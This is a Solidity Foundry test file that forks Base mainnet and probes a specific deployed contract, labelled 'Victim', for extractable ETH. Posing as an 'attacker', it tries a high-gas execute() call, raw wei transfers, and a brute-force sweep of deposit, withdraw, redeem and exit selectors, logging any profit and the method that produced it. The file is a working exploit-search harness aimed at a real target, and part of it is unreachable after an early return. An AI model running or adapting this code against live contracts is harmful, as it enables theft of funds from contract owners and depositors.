
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

contract HoneypotTestETH is Test {
    address victim = 0xB545d786a6a97C5D3F24F5F7BD1b6A2f5b0eB853;
    address attacker = address(0x1337);
    
    function setUp() public {
        vm.createSelectFork("https://mainnet.base.org");
        vm.label(victim, "Victim");
        vm.label(attacker, "Attacker");
    }

    function testSafeCycleETH() public {
        vm.startPrank(attacker);
        
        console.log("Contract ETH Balance:", address(victim).balance);

        
        // Adaptive Simulation for Sequencer Fee (Updated Strategy)
        // Ensure tx.origin is attacker for refund checks
        vm.stopPrank();
        vm.startPrank(attacker, attacker);

        vm.deal(attacker, 20 ether);
        uint256 sfBalBefore = attacker.balance;
        
        // 1. Aggressive Gas Price Simulation
        // Force high gas price to trigger potential refund logic
        vm.txGasPrice(1000 gwei); 
        
        bool sfSuccess;
        // Attempt standard execute
        (sfSuccess, ) = victim.call{value: 0.0001 ether}(abi.encodeWithSignature("execute()"));
        
        bool profitFound = false;
        if (sfSuccess) {
             if (attacker.balance > sfBalBefore) {
                 profitFound = true;
                 console.log("PROFIT_WEI:", attacker.balance - sfBalBefore);
                 console.log("SUCCESS_METHOD: sequencer_fee_high_gas");
             }
        }

        // 2. Fallback probing if no profit found (or failed)
        // Try sending 1 wei to contract address (no data)
        if (!profitFound) {
             // Reset balance for clean check (optional, but let's just check relative gain)
             uint256 balCheck = attacker.balance;
             (sfSuccess, ) = victim.call{value: 1 wei}("");
             if (sfSuccess) {
                 if (attacker.balance > balCheck) {
                     profitFound = true;
                     console.log("PROFIT_WEI:", attacker.balance - balCheck); // Net gain from this step
                     console.log("SUCCESS_METHOD: sequencer_fee_fallback_wei");
                 }
             }
        }
        
        if (profitFound) {
             vm.stopPrank();
             return;
        }

        uint256 sfBalAfterFinal = attacker.balance;
        if (sfBalAfterFinal > sfBalBefore) {
            console.log("PROFIT_WEI:", sfBalAfterFinal - sfBalBefore);
        } else {
            console.log("[SIM] No profit or loss detected.");
        }
        console.log("SUCCESS_METHOD: sequencer_fee_no_profit");
        vm.stopPrank();
        return;
    
        
        uint256 amount = 1 ether; // Flash Loan Amount
        vm.deal(attacker, amount); 
        console.log("Flash Loan Mode: 20 ETH simulated");
        
        uint256 balBefore = attacker.balance;

        // 1. Deposit
        bool success;
        
        // Try deposit() first
        (success, ) = victim.call{value: amount}(abi.encodeWithSignature("deposit()"));
        
        // Flexible entry: Try alternative selectors if standard deposit fails
        if (!success) (success, ) = victim.call{value: amount}("");
        if (!success) (success, ) = victim.call{value: amount}(abi.encodeWithSignature("stake()"));
        if (!success) (success, ) = victim.call{value: amount}(abi.encodeWithSignature("contribute()"));
        if (!success) (success, ) = victim.call{value: amount}(abi.encodeWithSignature("enter()"));
        // Try Brute-force/ABI Sniffing
        if (!success) (success, ) = victim.call{value: amount}(abi.encodeWithSignature("execute()"));
        if (!success) (success, ) = victim.call{value: amount}(abi.encodeWithSignature("claim()"));
        if (!success) (success, ) = victim.call{value: amount}(abi.encodeWithSignature("refund()"));
        // Fallback: Raw call with 1 wei
        if (!success) (success, ) = victim.call{value: 1 wei}("");

        
        
        require(success, "Deposit failed (tried all variants)");
        
        
        // 2. Withdraw
        // Priority: withdraw(uint256) -> withdraw() -> withdrawAll() -> redeem(uint256)
        
        // Try withdraw(uint256)
        (success, ) = victim.call(abi.encodeWithSignature("withdraw(uint256)", amount));
        if (success) { _checkProfit(balBefore, "withdraw(uint256)"); vm.stopPrank(); return; }
        
        // Try withdraw() - no args
        (success, ) = victim.call(abi.encodeWithSignature("withdraw()"));
        if (success) { _checkProfit(balBefore, "withdraw()"); vm.stopPrank(); return; }

        // Try withdrawAll()
        (success, ) = victim.call(abi.encodeWithSignature("withdrawAll()"));
        if (success) { _checkProfit(balBefore, "withdrawAll()"); vm.stopPrank(); return; }

        // Try redeem(uint256) - ERC4626 standard
        (success, ) = victim.call(abi.encodeWithSignature("redeem(uint256,address,address)", amount, attacker, attacker));
        if (!success) (success, ) = victim.call(abi.encodeWithSignature("redeem(uint256)", amount));
        if (success) { _checkProfit(balBefore, "redeem(uint256)"); vm.stopPrank(); return; }

        // Try leave() / exit()
        (success, ) = victim.call(abi.encodeWithSignature("leave(uint256)", amount));
        if (!success) (success, ) = victim.call(abi.encodeWithSignature("exit()"));
        if (success) { _checkProfit(balBefore, "exit/leave"); vm.stopPrank(); return; }

        require(success, "Withdraw failed (tried all variants)");
        
        vm.stopPrank();
    }

    function _checkProfit(uint256 balBefore, string memory method) internal view {
        uint256 balAfter = attacker.balance;
        int256 profit = int256(balAfter) - int256(balBefore);
        console.log("SUCCESS_METHOD:", method);
        if (profit > 0) {
            console.log("PROFIT_WEI:", uint256(profit));
            console.log("[SIM] Profit found:", uint256(profit), "wei");
        } else {
            console.log("[SIM] No profit or loss detected.");
        }
    }
}
